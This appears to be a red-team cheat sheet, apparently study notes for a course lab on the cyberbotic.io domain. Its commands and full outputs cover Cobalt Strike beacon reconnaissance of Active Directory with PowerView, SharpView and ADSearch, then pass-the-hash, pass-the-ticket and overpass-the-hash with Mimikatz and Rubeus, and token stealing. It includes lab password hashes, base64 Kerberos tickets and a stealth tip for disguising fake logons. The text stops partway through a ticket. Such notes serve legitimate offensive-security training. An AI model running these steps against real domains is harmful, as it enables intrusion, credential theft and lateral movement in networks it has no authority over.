---
description: 11/18/2025
---

# Cheat Sheet Part 3

## Domain Reconnaissance

### PowerView

**Import script via PowerShell:**

```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

#### Get-Domain

**Returns a domain object for the current domain or the domain specified with `-Domain`. Useful information includes the domain name, the forest name and the domain controllers:**

```
beacon> powershell Get-Domain

Forest                  : cyberbotic.io
DomainControllers       : {dc-2.dev.cyberbotic.io}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : cyberbotic.io
PdcRoleOwner            : dc-2.dev.cyberbotic.io
RidRoleOwner            : dc-2.dev.cyberbotic.io
InfrastructureRoleOwner : dc-2.dev.cyberbotic.io
Name                    : dev.cyberbotic.io
```

#### Get-DomainController

**Returns the domain controllers for the current or specified domain:**

```
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl

Forest    : cyberbotic.io
Name      : dc-2.dev.cyberbotic.io
OSVersion : Windows Server 2022 Datacenter
```

#### Get-ForestDomain

**Returns all domains for the current forest or the forest specified by `-Forest`:**

```
beacon> powershell Get-ForestDomain

Forest                  : cyberbotic.io
DomainControllers       : {dc-1.cyberbotic.io}
Children                : {dev.cyberbotic.io}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : dc-1.cyberbotic.io
RidRoleOwner            : dc-1.cyberbotic.io
InfrastructureRoleOwner : dc-1.cyberbotic.io
Name                    : cyberbotic.io

Forest                  : cyberbotic.io
DomainControllers       : {dc-2.dev.cyberbotic.io}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : cyberbotic.io
PdcRoleOwner            : dc-2.dev.cyberbotic.io
RidRoleOwner            : dc-2.dev.cyberbotic.io
InfrastructureRoleOwner : dc-2.dev.cyberbotic.io
Name                    : dev.cyberbotic.io
```

#### Get-DomainPolicyData

**Returns the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller. Useful for finding information such as the domain password policy:**

```
beacon> powershell Get-DomainPolicyData | select -expand SystemAccess

MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
MinimumPasswordLength        : 7
PasswordComplexity           : 1
PasswordHistorySize          : 24
LockoutBadCount              : 0
RequireLogonToChangePassword : 0
ForceLogoffWhenHourExpire    : 0
ClearTextPassword            : 0
LSAAnonymousNameLookup       : 0
```

#### Get-DomainUser

Return all (or specific) user(s). To only return specific properties, use `-Properties`. By default, all user objects for the current domain are returned, use `-Identity` to return a specific user.

#### Return All Users

```
beacon> powershell Get-DomainUser -Properties DisplayName, MemberOf | fl

memberof : {CN=Group Policy Creator Owners,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Domain 
           Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Administrators,CN=Builtin,DC=dev,DC=cyberbotic,DC=io}

memberof : CN=Guests,CN=Builtin,DC=dev,DC=cyberbotic,DC=io

memberof : CN=Denied RODC Password Replication Group,CN=Users,DC=dev,DC=cyberbotic,DC=io

displayname : Bob Farmer
memberof    : {CN=Internet Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, 
              CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io}

displayname : John King
memberof    : {CN=Internet Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=MS SQL 
              Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Support Engineers,CN=Users,DC=dev,DC=cyberbotic,DC=io}

displayname : Nina Lamb
memberof    : {CN=Studio Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Internet 
              Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Domain Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io}

displayname : MS SQL Service

displayname : Squid Proxy

displayname : Honey Token
```

#### Return a Specific User

```
beacon> powershell Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl

displayname : John King
memberof    : {CN=Internet Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Support 
              Engineers,CN=Users,DC=dev,DC=cyberbotic,DC=io}
```

This shows that `jking` is a member of the **Support Engineers** group. &#x20;

Most privileges in a domain are delegated to domain groups, rather than individual users. &#x20;

So if we can find where this domain group has privileged access, we know that members will also have those privileges.

#### Get-DomainComputer

**Return all computers or specific computer objects:**

```
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

dnshostname              
-----------              
dc-2.dev.cyberbotic.io
fs.dev.cyberbotic.io
sql-2.dev.cyberbotic.io
web.dev.cyberbotic.io
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

#### Get-DomainOU

**Search for all organization units (OUs) or specific OU objects:**

```
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name

name              
----              
Domain Controllers
File Servers
Servers           
SQL Servers       
Web Servers       
Workstations
```

#### Get-DomainGroup

**Return all domain groups or specific domain group objects:**

```
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

samaccountname
--------------
Domain Admins 
Key Admins    
DnsAdmins     
MS SQL Admins 
Studio Admins
```

#### Get-DomainGroupMember

**Return the members of a specific domain group:**

```
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

MemberDistinguishedName                             
-----------------------                             
CN=Nina Lamb,CN=Users,DC=dev,DC=cyberbotic,DC=io    
CN=Administrator,CN=Users,DC=dev,DC=cyberbotic,DC=io
```

#### Get-DomainGPO

Return all Group Policy Objects (GPOs) or specific GPO objects. To enumerate all GPOs that are applied to a particular machine, use `-ComputerIdentity`.

```
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

displayname                      
-----------                      
Computer Certificates
Default Domain Controllers Policy
Default Domain Policy
LAPS
Proxy Settings
Server Admins
Vulnerable GPO
Windows Defender
Windows Firewall
Workstation Admins
```

#### Get-DomainGPOLocalGroup

Returns all GPOs that modify local group membership through Restricted Groups or Group Policy Preferences.  You can then manually find which OUs, and by extension which computers, these GPOs apply to.

```
beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

GPODisplayName     GroupName            
--------------     ---------            
Workstation Admins DEV\Support Engineers
Server Admins      DEV\Support Engineers
```

This shows that the Support Engineers group is being assigned some sort of local access to the machines to which these GPOs apply.  Although the GPO naming convention suggests this is local admin access, it may also be a different localgroup such as Remote Desktop Users.

#### Get-DomainGPOUserLocalGroupMapping

Enumerates the machines where a specific domain user/group is a member of a specific local group.  This is useful for finding where domain groups have local admin access, which is a more automated way to perform the manual cross-referencing described above.

```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl

ObjectName     : Support Engineers
GPODisplayName : Server Admins
ContainerName  : {OU=Servers,DC=dev,DC=cyberbotic,DC=io}
ComputerName   : {web.dev.cyberbotic.io, sql-2.dev.cyberbotic.io, fs.dev.cyberbotic.io}

ObjectName     : Support Engineers
GPODisplayName : Workstation Admins
ContainerName  : {OU=Workstations,DC=dev,DC=cyberbotic,DC=io}
ComputerName   : {wkstn-1.dev.cyberbotic.io, wkstn-2.dev.cyberbotic.io}
```

&#x20;This output confirms that the Support Engineers domain group is a member of the local Administrators group on machines: web, sql-2, fs, wkstn-1 and wkstn-2.

#### Get-DomainTrust

Return all domain trusts for the current or specified domain.

```
beacon> powershell Get-DomainTrust

SourceName      : dev.cyberbotic.io
TargetName      : cyberbotic.io
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 8/15/2022 4:00:00 PM
WhenChanged     : 8/15/2022 4:00:00 PM

SourceName      : dev.cyberbotic.io
TargetName      : dev-studio.com
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 8/16/2022 9:52:37 AM
WhenChanged     : 8/16/2022 9:52:37 AM
```

### SharpView

[SharpView](https://github.com/tevora-threat/SharpView) was designed to be a C# port of PowerView and therefore has much the same functionality.  However, one downside is that it doesn't have the same piping ability as PowerShell.

```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain

Forest                         : cyberbotic.io
DomainControllers              : {dc-2.dev.cyberbotic.io}
Children                       : {}
DomainMode                     : Unknown
DomainModeLevel                : 7
Parent                         : cyberbotic.io
PdcRoleOwner                   : dc-2.dev.cyberbotic.io
RidRoleOwner                   : dc-2.dev.cyberbotic.io
InfrastructureRoleOwner        : dc-2.dev.cyberbotic.io
Name                           : dev.cyberbotic.io
```

### ADSearch

[ADSearch](https://github.com/tomcarver16/ADSearch) has fewer built-in searches compared to PowerView and SharpView, but it does allow you to specify custom Lightweight Directory Access Protocol (LDAP) searches. &#x20;

These can be used to identify entries in the directory that match a given criteria.

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 

[*] TOTAL NUMBER OF SEARCH RESULTS: 10
	[+] cn : Administrator
	[+] cn : Guest
	[+] cn : krbtgt
	[+] cn : CYBER$
	[+] cn : Bob Farmer
	[+] cn : John King
	[+] cn : Nina Lamb
	[+] cn : MS SQL Service
	[+] cn : Squid Proxy
	[+] cn : STUDIO$
```

**Filters can be used to limit the search result further.  For instance, search for all domain groups which end in the word "admins":**

```
 beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 5
	[+] cn : Domain Admins
	[+] cn : Key Admins
	[+] cn : DnsAdmins
	[+] cn : MS SQL Admins
	[+] cn : Studio Admins
```

**These can be made more complex with further AND, OR and NOT conditions.  All attributes can be returned using the `--full` parameter, or specific attributes with the `--attributes` parameter:**

```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

[*] TOTAL NUMBER OF SEARCH RESULTS: 1
	[+] cn     : MS SQL Admins
	[+] member : CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io
```

**Additionally, the `--json` parameter can be used to format the output in JSON:**

```
[
  {
    "cn": "MS SQL Admins",
    "member": "CN=Developers,CN=Users,DC=dev,DC=cyberbotic,DC=io"
  }
]
```

## Pass the Hash

This is a technique that allows us to authenticate to a Windows Service using the NTLM hash of a user's password.

#### How does it work?

_PTH will start a new logon session with a fake identity and replace the session information with the domain, username, and NTLM hash provided._

{% hint style="warning" %}
This command requires elevated privileges.
{% endhint %}

```
beacon> getuid

beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c

 user	: jking
domain	: DEV
program	: C:\Windows\system32\cmd.exe /c echo d7ffec0f6ec > \\.\pipe\5232d5
impers.	: no
NTLM	: 59fc0f884922b4ce376051134c71e22c
  |  PID  20552
  |  TID  23444
  |  LSA Process is now R/W
  |  LUID 0 ; 1832336 (00000000:001bf590)
  \_ msv1_0   - data copy @ 0000027A0F6357D0 : OK !
  \_ kerberos - data copy @ 0000027A0F62F118
   \_ des_cbc_md4       -> null             
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000027A0F7BEAA8 (32) -> null 
```

As we can see, Mimikatz will pass the new credentials over a named pipe, which Beacon will then impersonate automatically.&#x20;

#### Check access gained to newly impersonated user

```
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```

#### Dropping Impersonation

**If desired, we can "drop" our impersonation afterwards:**

```
beacon> rev2self
```

### Pass the Ticket

This is a technique that allows us to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one that you create.

Accessing a remote resource will then allow that authentication to happen via Kerberos.

{% hint style="warning" %}
Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.

If we passed jking's TGT into the LUID for bfarmer, it would erase bfarmer's TGT and cause all sorts of authentication issues for the user.
{% endhint %}

1. **Start a new hidden process of our choosing using the `CreateProcessWithLogonW()` API:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : YDWRIEHD
[*] Domain          : 3AUPAH8I
[*] Password        : FNX6N142
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 21356
[+] LUID            : 0xa6997e
```

2. **Pass the TGT into the new LUID using the Rubeus `ptt` command:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0xa6997e /ticket:doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRT0D6Q2mZUmHG6vNmFmTo2iyAeCXjkDYSBR8X8Lr/nnRMqHtJU9Y7DYE4WIgDtHpmpOVixcdl+Je2FKsHoDCAjuwMio7ghbRKvQIEBKJp165RWwBgeBRdtRl9pZdZUBrGEQ8dztaRUn/piP2c2uMbC7KJDj8LLH4XW0JCJKuNo7TLFIgvPVTVMnZrjI1nMIjgvYz1Xbhr7PUE//SAhXI5e1cO2QUKEWPogeDyX4EdPWZU2FJgvCNY7K2VulcMtJUkGFc3egNXlrKYakaD9qo5fXOig3QNoICa2aMa5/CtfqGIcpX1M81UoM827NYOC7PHNHN6x68eFfN2TFQfY8dODBcoXzXlNMCuPFDsJpkC6/cdK2o1I2xf22sy5ljxkUWCjHrFDvyTnlgdhn0mxV9F32aRQixU9vGltvOrZl31/2O+0NCONnNNgqW3g8+OBUe8mqd0iBgvNXy1SE31kU+87cyMkLzGsIWbcJRLDlx2KwTWLcD5ZEmwnVUTDnr/MTdv3ir6JRrNZSNP0TFdZuq2KGVBOAqmIwBf4tSQJqWdf3jj7ubQ8ZwsuGHB9sYq1CPo2V69tELa5exXVupNS2Mc6SD/yTkk4FmXOV1I8O2AU5gJXRUWGIsUYZ1Je0tLKfLsQeWwe72pHhVKgNwZqxl3mMsjXqcC6cz5T3oivd6lbGQBOERZK4286T/mZGEwPA03lnLTzleQGduSga0F9tPRncYt9kRUZVAvn5DgzGNv8GmMus2bKg9uoc9N7RPQNPtS77F442z9/1nAx1PGyal66w5idgvk8Ymkdzv66zfVWXf1S0UbBZzzHEykcrX1VmHzvTzqDtSLcXUZ5W/0j7KfLnb5kMFCxLTaieu7sE2Eb6n/rwOkEWG5sKkZkss4lk39w0pn7bowQhF/ZKesGIoLcpmgoL0j6qRmYnDQWgTT79qPlENyirZtaWSBGvc0Ep3mq8mEfor0n7/AkRojpQ3XjHwKUmguiShnBzSWYvNTuHtShB+5gIj1XEg2TCRHlgqGeYmaRuRcQ3HwvqIb4XXAhRiC6x8tws4zUtEAR5Monj01s9bP6jBEKQJjoS2wzJmv0Gbhz2nNraqi4OMQciFjB5msRHVH9bDY9kEFdS2ehmrBPuIWv9ojq1ejiOwV6oZT8YuztWv/msPK6/ZKgopD6+ywyi5wouJEPd5fAHdGlcmBKnYn/CxpfUNjLJsXQBmvqtlXvmbuU1u8WT8auqhuF3sAJt5HiKR05o8uf8A7FIYsIPKmTyehGZTS9zuiKp3kAhIgXFsD5Lm6AWssc1FbwxmVKTa1dY+cyWCwXNiLIcWHjAEGtuxZah2hgSmkntXBrM8Vc4Y7vcTltmLI99EwCGPUiyr50KYrqHc2DEcsvvxGTEOFOTQ7hI2dElY2CvyrA7RhuIcUtl+xvF2SVEWr4pQz1HU5vQyLzmKFZtBbwGi0tMr8c6totBU7kKA1ZeYSqcgLgo4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgLTovMHNCu7EWKfVqxkfB9f6crVX/vHusZ7PZ1QJH+IahExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6MHAwUAQOEAAKURGA8yMDI1MTExODIxNTg1MFqmERgPMjAyNTExMTkwNzU4NTBapxEYDzIwMjUxMTI1MjE1ODUwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8= 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Import Ticket
[*] Target LUID: 0xa6997e
[+] Ticket successfully imported!
```

{% hint style="info" %}
We received the base64-encoded ticket from the **Dumping Tickets and extracting them from memory** section in Cheat Sheet Part 2.
{% endhint %}

**Rubeus triage will now show jking's TGT inside this LUID:**

```
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
 
 | 0x84e75  | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 11/19/2025 7:58:50 AM |
```

The final step is to impersonate the process that we created with `createnetonly` using Cobalt Strike's `steal_token` command. &#x20;

**At a minimum, this requires the PID of the target process, which in this example, is `21356`.  We'll then be able to access the remote machine:**

```
beacon> steal_token 21356

[11/19 00:13:09] [*] Tasked beacon to steal token from PID 21356
[11/19 00:13:13] [+] host called home, sent: 24 bytes
[11/19 00:13:13] [+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys
```

#### For Stealth Purposes...

**We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password:**

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```

## Overpass the Hash

_**Overpass the hash**_ is a technique which allows us to <mark style="color:yellow;">request a Kerberos TGT for a user, using their NTLM or AES hash</mark>.&#x20;

Elevated privileges are required to obtain user hashes, but not to actually request a ticket.

### Rubeus `asktgt`

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 59fc0f884922b4ce376051134c71e22c
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFojCCBZ6gAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBFkwggRVoAMCARKhAwIBAqKCBEcEggRDItoZat5tS62H/z276ionSilssQDDKX+OYRwCRXGNUr4HpSWboREj27/UENFhRqcCVdXvxGAIkMPOSILco4bj+jIYIwG9kbk16e5vWWMJVTvuyvyRPrX7Incv5Avknn1oImKTjF9jX2IiyODt/2r6NT92Z53hW5Y9kSvHZNGQEN81dBHaJNoVkC/BQT3/DC+BymlwgrcagMDK3PJjm2LND3njbEIc7VMx7udlnMsAw0MQoqDRDH/yTZM8NLdIP/totcvRMVqCaAw6KV1f92ly6XlZjjGZ4uYOHEPEzMJTAFYzmJGm1gdzvHC0dEwUR0/WC6LJQFU6veiPGTsQhcW4OhPqjuSJAblctmW2wlBCDAqjqjBLBQ6y/u/9PA2Y8K1UXAJrt0QfphHVKXi3wXDuXjJA3F+BlC5Ww7vHwmohCgjV5OQ3m8wwmL56rX7nlRELG0+gfltDxNEZEzffTDDntxEZOemzE/3q5JkGvQvUsapSTzEcJTVhwDltVwR4bENUf67TiXM0wgCQzmcemDf2gPFI5LL0ombeMTzdcAS5X69XHQfiEOV0yHBbyIQJSvzZY+kGaUPFM6I2P6o1INSi5UZxft2/EKtU1x56XXcWEhSHObhy7iVo3Ysl/e+6gMgqhscEai5N2vcgjCLOFb0CkSpJzjy+nGRMRgtKGi+LqVsjDGfUQMTUzDeVhkEqKnpTvZt0npp8Ls/sI2bO/PolRok4VW9HVmJRNxLDq7XLbc9bxhRfLr2Sqs5VY7+OCq37vkrDyHo7azOW7BXX2OgWmBws8oQANeWuma2AHQmEMo3gb0tBQsH4wkCBusB45yS67e0xLdlDSsyGq11ldTwnaHl24WKzwbNO/hEQjHNwiPZ5QOy7UsL4yiHtPIzO0rqKZKjkDe0rX9rvJBQugZ3KTH8DNgYpOs0BqqslfKMNxlegjNt0QniPaA/o0ymqK/yOEpgs/N5gOn93Ee7ObWQUGNk5EBCGlmRCx8xl4p6/1GWyrtISUV4fM+LL2LnUWeoiBLUm+xgHk+a+nA/04cPy4RYIDNAQJ7aaBACP8yf/82ZhmPLDjlH2tnAlFgVrf+9sqlUGWKA4Z8OeoakVGKlonNSwV33IPRjV3QAuqgjl5xRGgM2ztp5NLm1kdLWsOkvjcR5nXAHwJYztwuq/180wUZEHKiaFCE8MWLB3cpEjDeuPGoFmnnTfjaFr+AVSLCfR0HNauBTYnuAdhPYrXOslpAgRGKVJdxi7MHU4/PSjiA01ipXsNv2kd+vOW/RdCQDZykOR0ndQgOvB7577AXv/pUTv5cXoo59laDde0CK1qlo1l26Fk+iRXMPZ+bN4aCl2jozfiNdm4sTdC/pq2YHgS2HauPVtYuniIr2qFGUz/7IsnnYEQfmcpbHkL3ZD09w0tm7Aci4GDh04+Il0lbTgR4JWYAe/8uwdIwH6dStPgAhf91qjgeIwgd+gAwIBAKKB1wSB1H2B0TCBzqCByzCByDCBxaAbMBmgAwIBF6ESBBAzJN8IvzTJHRZmov+aip5WoRMbEURFVi5DWUJFUkJPVElDLklPohIwEKADAgEBoQkwBxsFamtpbmejBwMFAEDhAAClERgPMjAyNTExMTkwMDIxMTlaphEYDzIwMjUxMTE5MTAyMTE5WqcRGA8yMDI1MTEyNjAwMjExOVqoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWRldi5jeWJlcmJvdGljLmlv

  ServiceName              :  krbtgt/dev.cyberbotic.io
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  jking
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  11/19/2025 12:21:19 AM
  EndTime                  :  11/19/2025 10:21:19 AM
  RenewTill                :  11/26/2025 12:21:19 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MyTfCL80yR0WZqL/moqeVg==
  ASREP (key)              :  59FC0F884922B4CE376051134C71E22C
```

{% hint style="warning" %}
If you are getting an unhandled exception, I had to `rev2self` back to `SYSTEM` to correct this.
{% endhint %}

This new TGT can then be leveraged via Pass the Ticket.

**To obtain a TGT encrypted using AES256 (0x12), you guessed it, use the user's AES256 hash instead:**

```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /nowrap

  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 

[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Using domain controller: 10.10.122.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFwjCCBb6gAwIBBaEDAgEWooIEuzCCBLdhggSzMIIEr6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFkZXYuY3liZXJib3RpYy5pb6OCBGkwggRloAMCARKhAwIBAqKCBFcEggRTunlrVFUFATqmy8eppguKOYBlDwmtrQYAOmH3qOhMAzxkEq0KWOUv6VHQKjhLJ7OeKsOQcj6jTJYHTHdAQDKaO+jg5dB2aiZk2LAkDSY1WMEYwDGm8D+8lWiiD/NDrIasL9W7tvGy/lVOD5xYvPDUgxTYWNDmS5ZS1n/Aayw8mAHAoVjTjQhvsBdmyDooLp/RXA5wlqT7BKMUoBc+ccsMPwOTaqiOR7pceZSOyh3RDVpaV4d51qrfpvw/mSYzMUWHeMPFr2V73ENkjZ83Az1Z1up7i4S1925yX18zXQpK6iw/lDeJp8qQIvqzF2ZQUo7mNeiz0zNoMwiFEX2YDkZwRpO+bYiR1vkVBfQRBW+NdeYuh0pQ6mgJSfDqxvtPee+1DcUWktxKFMMu7lqs47+uGwLwL4hfd9SLHSmQdypVrWLJOaO6Y2PbPPJeDrUsdjjl5yojID1NQlzkxTtQlK9p+1XjThF2/NGcu13VcYKMAXLbhraUFvLvLi3IC2DiguQA+zVgPOdNHCosTlsrebp7o7ASxw2K8cbVm4h0erWQZyFzG7JFnq1uCU1jTL05glI8f5EDPlrH6S9/5VUJDw0LgOrU/AYRhRsf57rPHkWc/C+J+yT8G4v9m4zGiRtNmm/X4EerLUzlsf+R5YgnIaWW+8cc3xNdE4klDSr1X6771t96Bkd1Xn0Z5lHU0/Ms8G/296KcV1pKBkvWYp83gdFRMZJoNhueMXCz5b6StH+fZSMJFZlXt5uDNSnuwqbqogp3b3Gl9l76TZ6k0Vk+Rqrv8H2F3yZBzc58UjBWwarEDmtazhdS6hVWaIJAujS1U4GlRjp6OJFH1TacBhTWJFLkvEwyBYd8ep6zA4CgASXWKuQxTT2il8dypjlBYsriynLDJVSTOi+A0RuMyMcsSdDzRbNpuY+R4X5zx3OH30rSeLZg3OW5umy2lQlT0vO6L8ecqJDXD6ClSllKC6U794rZcwfZL+21URdDl0tjA1fQlCQCEGzYZNQOwsu+ZHDSoZyNfuJEhORd+VnvjVWjpNGsAYqYOyBNmTVGaExG4hg/tV3PdokQjm0c72yaxMiLFenER6CVoJ10sL06b4gWfrg3ZtWsBp//f+UXcLr3iLLoKrEAM7gvqfgBtOZh6SpM67UkPgTe8lqV+ivFR7L4AR40c3gUbHL1EDsyCu0U5lLWaMtwUbRxQ0GIKru8nJq99XyC0ymoTUUAb7xig5mdarKLiAXxkv0X418W/fqf71c7keKV67XC+ZzVDfBEYkv0SFaLc/mYvtCLDi3sc957J6qY+mNJ6UN98vXbb3OB0vpJS+vUTvrb+u/6WMDY0fHFto2dekatA4NkRl6iDWTGvZ+Nnd+886dsJqhdJAK0+ewwmxcE7Qnb2aPAKUyXAMGWg49KkFh8SbQasLUAy1MZYb2RkvhT1C71T3C1Mgjymk1WgzBsYqbsOSrJDFn58RRIz9xJ1iG4o4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgp54W5zJmPXXgpjErEIk3kaDOQElYE6CUj5rNQkiZSoWhExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVqa2luZ6